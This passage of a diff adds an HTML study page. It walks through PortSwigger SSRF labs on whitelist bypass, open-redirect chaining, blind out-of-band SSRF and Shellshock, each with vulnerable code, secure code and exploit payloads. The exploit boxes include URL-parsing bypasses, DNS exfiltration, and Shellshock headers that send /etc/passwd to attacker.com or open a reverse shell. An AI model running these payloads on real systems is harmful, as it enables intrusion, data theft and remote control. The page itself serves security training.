+<span class="secure-line"></span>
+<span class="secure-line">    # Reject URLs with fragments before path</span>
+<span class="secure-line">    if '#' in decoded.split('/')[2] if len(decoded.split('/')) > 2 else False:</span>
+<span class="secure-line">        return False</span>
+<span class="secure-line"></span>
+<span class="secure-line">    parsed = urlparse(decoded)</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # ✅ Exact host match, not substring</span>
+<span class="secure-line">    if parsed.hostname not in ALLOWED_HOSTS:</span>
+<span class="secure-line">        return False</span>
+<span class="secure-line"></span>
+<span class="secure-line">    # ✅ Only allow HTTPS</span>
+<span class="secure-line">    if parsed.scheme != 'https':</span>
+<span class="secure-line">        return False</span>
+<span class="secure-line"></span>
+<span class="secure-line">    return True</span>
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+
+<span class="secure-line">    if not strict_url_validate(stock_url):</span>
+<span class="secure-line">        abort(403, "Invalid URL")</span>
+
+    response = requests.get(stock_url, timeout=5)
+    return response.text</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Whitelist bypass using URL parsing tricks</span>
+# Using @ for embedded credentials
+# Format: http://user:pass@host/
+# Validator sees: stock.weliketoshop.net in URL
+# HTTP lib goes to: localhost
+
+http://localhost@stock.weliketoshop.net/
+http://localhost:80@stock.weliketoshop.net/
+
+# Using # to confuse parsing
+http://localhost#@stock.weliketoshop.net/admin
+
+# Double URL encoding (the key technique!)
+# @ = %40, then %40 = %2540
+http://localhost%2523@stock.weliketoshop.net/
+
+# The winning payload combines techniques:
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
+# How it works:
+# 1. Validator URL-decodes once: localhost:80%23@stock...
+# 2. Sees "stock.weliketoshop.net" - whitelist passes
+# 3. HTTP library decodes: localhost:80#@stock...
+# 4. Fragment (#) starts - everything after ignored
+# 5. Request goes to localhost:80/admin/delete
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 5: Filter Bypass via Open Redirect -->
+            <div id="lab5-open-redirect" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-external-link-alt"></i> Lab 5: SSRF Filter Bypass via Open Redirection</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application has strict URL validation but contains an open redirect vulnerability. By chaining
+                        the open redirect with SSRF, the attacker can bypass the whitelist and access internal resources.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>Chaining Vulnerabilities:</strong> Even with strong SSRF protections, an open redirect on the
+                    allowed domain can be abused to redirect the server's request to internal resources.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>SSRF endpoint has strict host whitelist</li>
+                        <li>Same application has an open redirect endpoint</li>
+                        <li>Open redirect is on the whitelisted host</li>
+                        <li>Server follows redirect to attacker-controlled destination</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab5"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab5"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab5-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>app.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+from urllib.parse import urlparse
+
+# Stock checker with "good" validation
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+    parsed = urlparse(stock_url)
+
+<span class="vuln-line">    # ✓ Looks secure - strict host check</span>
+    if parsed.hostname != 'stock.weliketoshop.net':
+        abort(403, "Host not allowed")
+
+<span class="vuln-line">    # ❌ But follows redirects!</span>
+<span class="vuln-line">    response = requests.get(stock_url, allow_redirects=True)</span>
+    return response.text
+
+<span class="vuln-line"># ❌ Open redirect on the same host!</span>
+@app.route('/product/nextProduct')
+def next_product():
+    path = request.args.get('path')
+<span class="vuln-line">    # ❌ No validation of redirect destination</span>
+<span class="vuln-line">    return redirect(path)</span>
+
+# Attack chain:
+# 1. SSRF to: stock.weliketoshop.net/product/nextProduct?path=http://192.168.0.12/admin
+# 2. Whitelist check passes (host is stock.weliketoshop.net)
+# 3. Server requests the open redirect endpoint
+# 4. Open redirect sends 302 to http://192.168.0.12/admin
+# 5. Server follows redirect, fetches internal admin!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab5-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>app.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+from urllib.parse import urlparse
+
+@app.route('/product/stock', methods=['POST'])
+def check_stock():
+    stock_url = request.form.get('stockApi')
+    parsed = urlparse(stock_url)
+
+    if parsed.hostname != 'stock.weliketoshop.net':
+        abort(403, "Host not allowed")
+
+<span class="secure-line">    # ✅ Don't follow redirects automatically</span>
+<span class="secure-line">    response = requests.get(stock_url, allow_redirects=False, timeout=5)</span>
+
+<span class="secure-line">    # ✅ If redirect, validate the destination</span>
+<span class="secure-line">    if response.status_code in (301, 302, 303, 307, 308):</span>
+<span class="secure-line">        redirect_url = response.headers.get('Location')</span>
+<span class="secure-line">        redirect_parsed = urlparse(redirect_url)</span>
+<span class="secure-line">        if redirect_parsed.hostname != 'stock.weliketoshop.net':</span>
+<span class="secure-line">            abort(403, "Redirect to unauthorized host")</span>
+
+    return response.text
+
+<span class="secure-line"># ✅ Fix the open redirect too!</span>
+@app.route('/product/nextProduct')
+def next_product():
+    path = request.args.get('path')
+<span class="secure-line">    # ✅ Only allow relative paths</span>
+<span class="secure-line">    if path.startswith('/') and not path.startswith('//'):</span>
+<span class="secure-line">        return redirect(path)</span>
+<span class="secure-line">    abort(400, "Invalid redirect")</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Chaining open redirect with SSRF</span>
+# Step 1: Find an open redirect on the whitelisted host
+# Test: /product/nextProduct?path=https://evil.com
+# If redirects to evil.com, it's exploitable
+
+# Step 2: Chain with SSRF
+stockApi=http://stock.weliketoshop.net/product/nextProduct?path=http://192.168.0.12:8080/admin
+
+# URL breakdown:
+# - Initial request: stock.weliketoshop.net (passes whitelist)
+# - Open redirect to: 192.168.0.12:8080/admin
+# - Server follows redirect to internal admin
+
+# Step 3: Exploit the admin
+stockApi=http://stock.weliketoshop.net/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
+
+# URL encode the path parameter if needed:
+stockApi=http://stock.weliketoshop.net/product/nextProduct?path=http%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 6: Blind SSRF with Out-of-Band Detection -->
+            <div id="lab6-blind-oob" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-satellite-dish"></i> Lab 6: Blind SSRF with Out-of-Band Detection</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Practitioner</span></div>
+                    </div>
+                    <p class="lab-description">
+                        The application makes server-side requests but doesn't return the response to the user. By using
+                        out-of-band techniques (DNS lookups, HTTP callbacks), attackers can confirm SSRF and exfiltrate data.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-info-circle"></i>
+                    <strong>Blind SSRF:</strong> When you can't see the response, use out-of-band channels like DNS or HTTP
+                    callbacks to Burp Collaborator or your own server to detect the vulnerability.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Application makes server-side HTTP requests</li>
+                        <li>Response is not returned to the user</li>
+                        <li>Use external server to detect the request</li>
+                        <li>DNS lookups can exfiltrate data in subdomains</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab6"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab6"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab6-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>analytics.py</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+
+@app.route('/product', methods=['GET'])
+def view_product():
+    product_id = request.args.get('productId')
+
+<span class="vuln-line">    # ❌ Referer header used for analytics</span>
+<span class="vuln-line">    referer = request.headers.get('Referer')</span>
+
+    if referer:
+<span class="vuln-line">        # ❌ Server makes request to Referer URL</span>
+<span class="vuln-line">        # Response is not returned - "blind" SSRF</span>
+<span class="vuln-line">        try:</span>
+<span class="vuln-line">            requests.get(referer, timeout=3)</span>
+<span class="vuln-line">        except:</span>
+<span class="vuln-line">            pass  # Silently ignore errors</span>
+
+    # Return product page - no SSRF response visible
+    return render_template('product.html', id=product_id)
+
+# Attack: Set Referer to attacker's server
+# Referer: http://attacker-server.com/ssrf-detected
+#
+# Or use Burp Collaborator:
+# Referer: http://xyz123.burpcollaborator.net
+#
+# If you receive the request, SSRF is confirmed!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab6-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>analytics.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python">import requests
+from urllib.parse import urlparse
+
+<span class="secure-line"># ✅ If you need to validate referers, use whitelist</span>
+<span class="secure-line">ALLOWED_REFERER_DOMAINS = {'example.com', 'www.example.com'}</span>
+
+@app.route('/product', methods=['GET'])
+def view_product():
+    product_id = request.args.get('productId')
+    referer = request.headers.get('Referer')
+
+    if referer:
+<span class="secure-line">        # ✅ Validate referer domain</span>
+<span class="secure-line">        try:</span>
+<span class="secure-line">            parsed = urlparse(referer)</span>
+<span class="secure-line">            if parsed.hostname not in ALLOWED_REFERER_DOMAINS:</span>
+<span class="secure-line">                referer = None  # Ignore untrusted referers</span>
+<span class="secure-line">        except:</span>
+<span class="secure-line">            referer = None</span>
+
+<span class="secure-line">    # ✅ Better: Don't make server-side requests based on user input</span>
+<span class="secure-line">    # Log referer to database instead</span>
+<span class="secure-line">    if referer:</span>
+<span class="secure-line">        log_referer_to_db(referer)  # Just store, don't fetch</span>
+
+    return render_template('product.html', id=product_id)
+
+<span class="secure-line"># ✅ Best practice: Use client-side analytics (JS)</span>
+<span class="secure-line"># instead of server-side URL fetching</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Out-of-band SSRF detection</span>
+# Using Burp Collaborator
+GET /product?productId=1 HTTP/1.1
+Host: vulnerable-website.com
+Referer: http://BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net
+
+# Using your own server
+Referer: http://your-server.com/ssrf-callback
+
+# Check server logs for incoming request from target
+
+# DNS-based exfiltration (works even if HTTP blocked)
+Referer: http://data-to-exfil.your-domain.com
+# Check DNS logs for the subdomain lookup
+
+# Exfiltrate internal data via DNS:
+# 1. SSRF to internal API that returns sensitive data
+# 2. Server-side code sends data in DNS query
+# Example payload for exfil:
+Referer: http://internal-api.local/?callback=http://$(whoami).attacker.com
+
+# Common OOB testing services:
+# - Burp Collaborator (built into Burp Suite Pro)
+# - interactsh (open source: https://app.interactsh.com)
+# - webhook.site (for HTTP callbacks)
+# - requestbin.com
+                    </div>
+                </div>
+            </div>
+            <!-- Lab 7: Blind SSRF with Shellshock Exploitation -->
+            <div id="lab7-shellshock" class="lab-content hidden">
+                <div class="lab-header">
+                    <h2><i class="fas fa-bomb"></i> Lab 7: Blind SSRF with Shellshock Exploitation</h2>
+                    <div class="lab-meta">
+                        <div class="meta-item"><i class="fas fa-layer-group"></i><span>PortSwigger Web Security Academy</span></div>
+                        <div class="meta-item"><i class="fas fa-signal"></i><span>Difficulty: Expert</span></div>
+                    </div>
+                    <p class="lab-description">
+                        A blind SSRF can be escalated to RCE by targeting internal servers vulnerable to Shellshock (CVE-2014-6271).
+                        The attacker crafts HTTP headers containing Bash commands that execute on vulnerable CGI endpoints.
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <i class="fas fa-exclamation-triangle" style="color: var(--accent-red);"></i>
+                    <strong>Shellshock + SSRF = RCE:</strong> Shellshock allows command execution via malformed HTTP headers
+                    when processed by Bash-based CGI scripts. Combined with SSRF, you can execute commands on internal servers.
+                </div>
+
+                <div class="vuln-section">
+                    <h3><i class="fas fa-bug"></i> The Vulnerability</h3>
+                    <ul class="vuln-list">
+                        <li>Blind SSRF exists in the application</li>
+                        <li>Internal server runs vulnerable Bash (Shellshock)</li>
+                        <li>CGI scripts pass HTTP headers to Bash environment</li>
+                        <li>Malformed User-Agent header triggers command execution</li>
+                    </ul>
+                </div>
+
+                <div class="code-review-section">
+                    <div class="code-tabs">
+                        <button class="code-tab active" data-view="vulnerable" data-lab="lab7"><i class="fas fa-exclamation-triangle"></i> Vulnerable Code</button>
+                        <button class="code-tab secure" data-view="secure" data-lab="lab7"><i class="fas fa-shield-alt"></i> Secure Code</button>
+                    </div>
+                    <div class="code-container" id="lab7-vulnerable">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>analytics.py + internal CGI</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"># External server - Blind SSRF
+@app.route('/product', methods=['GET'])
+def view_product():
+<span class="vuln-line">    referer = request.headers.get('Referer')</span>
+<span class="vuln-line">    user_agent = request.headers.get('User-Agent')</span>
+
+    if referer:
+<span class="vuln-line">        # ❌ Forwards User-Agent header to internal request</span>
+<span class="vuln-line">        headers = {'User-Agent': user_agent}</span>
+<span class="vuln-line">        requests.get(referer, headers=headers, timeout=3)</span>
+
+    return render_template('product.html')
+
+# ------------------------------------------
+# Internal server CGI script (192.168.0.x)
+# /cgi-bin/status.sh - vulnerable to Shellshock
+#!/bin/bash
+# CGI script - Bash processes HTTP headers as env vars
+<span class="vuln-line"># HTTP_USER_AGENT becomes environment variable</span>
+<span class="vuln-line"># Shellshock: () { :; }; allows command injection</span>
+
+echo "Content-Type: text/html"
+echo ""
+echo "Server Status: OK"
+
+# When User-Agent = () { :; }; /usr/bin/id
+# Bash executes /usr/bin/id before the script runs!</code></pre>
+                        </div>
+                    </div>
+                    <div class="code-container hidden" id="lab7-secure">
+                        <div class="code-header"><div class="code-filename"><i class="fab fa-python"></i><span>analytics.py (Secure)</span></div></div>
+                        <div class="code-block">
+                            <pre><code class="language-python"><span class="secure-line"># ✅ Fix 1: Don't make SSRF requests at all</span>
+<span class="secure-line"># Log data instead of fetching URLs</span>
+
+@app.route('/product', methods=['GET'])
+def view_product():
+    referer = request.headers.get('Referer')
+    user_agent = request.headers.get('User-Agent')
+
+<span class="secure-line">    # ✅ Just log to database, don't fetch</span>
+<span class="secure-line">    if referer:</span>
+<span class="secure-line">        log_analytics(referer, user_agent)</span>
+
+    return render_template('product.html')
+
+<span class="secure-line"># ✅ Fix 2: Update Bash on all internal servers</span>
+<span class="secure-line"># Shellshock was patched in 2014</span>
+<span class="secure-line"># apt-get update && apt-get upgrade bash</span>
+
+<span class="secure-line"># ✅ Fix 3: Replace CGI with modern alternatives</span>
+<span class="secure-line"># - Use Python/Node.js web frameworks</span>
+<span class="secure-line"># - Use FastCGI instead of CGI</span>
+<span class="secure-line"># - Avoid shell scripts for web handlers</span>
+
+<span class="secure-line"># ✅ Fix 4: If SSRF is needed, sanitize headers</span>
+<span class="secure-line">def safe_request(url):</span>
+<span class="secure-line">    # Only send safe, hardcoded headers</span>
+<span class="secure-line">    safe_headers = {'User-Agent': 'Analytics-Bot/1.0'}</span>
+<span class="secure-line">    return requests.get(url, headers=safe_headers)</span></code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-section">
+                    <h3><i class="fas fa-code"></i> Exploitation</h3>
+                    <div class="payload-box">
+                        <span class="payload-label">Shellshock + Blind SSRF RCE</span>
+# Shellshock payload structure:
+# () { :; }; COMMAND
+
+# Step 1: Use SSRF to target internal CGI endpoint
+GET /product?productId=1 HTTP/1.1
+Host: vulnerable-website.com
+Referer: http://192.168.0.X:8080/cgi-bin/status.cgi
+User-Agent: () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR.net
+
+# The server:
+# 1. Makes request to internal 192.168.0.X
+# 2. Passes User-Agent header to CGI
+# 3. Bash processes the malformed header
+# 4. Shellshock triggers, runs nslookup
+# 5. DNS request sent with output (whoami)
+
+# Other useful Shellshock payloads:
+User-Agent: () { :; }; /bin/bash -c 'cat /etc/passwd | nc attacker.com 4444'
+User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1
+User-Agent: () { :; }; curl http://attacker.com/?data=$(cat /etc/passwd | base64)
+
+# Scan internal network for CGI:
+Referer: http://192.168.0.1/cgi-bin/test.cgi
+Referer: http://192.168.0.1/cgi-bin/status
+Referer: http://192.168.0.1/cgi-bin/printenv
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script>
+        document.querySelectorAll('.code-tab').forEach(tab => {
+            tab.addEventListener('click', function(e) {
+                e.preventDefault();
+                const section = this.closest('.code-review-section');
+                const view = this.dataset.view;
+                const labId = this.dataset.lab;
+
+                section.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
+                this.classList.add('active');
+
+                const vulnEl = document.getElementById(`${labId}-vulnerable`);
+                const secureEl = document.getElementById(`${labId}-secure`);
+
+                if (vulnEl && secureEl) {
+                    if (view === 'vulnerable') {
+                        vulnEl.classList.remove('hidden');
+                        secureEl.classList.add('hidden');
+                    } else {
+                        vulnEl.classList.add('hidden');
+                        secureEl.classList.remove('hidden');
+                    }
+                }
+            });
+        });
+
+        document.querySelectorAll('.lab-item').forEach(item => {
+            item.addEventListener('click', () => {
+                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
+                item.classList.add('active');
+
+                const labId = item.dataset.lab;
+                document.querySelectorAll('.lab-content').forEach(content => {
+                    content.classList.add('hidden');
+                });
+
+                const labContent = document.getElementById(labId);
+                if (labContent) {
+                    labContent.classList.remove('hidden');
+                }
+            });
+        });
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const firstLab = document.querySelector('.lab-item');
+            if (firstLab) firstLab.click();
+        });
+    </script>
+</body>
+</html>
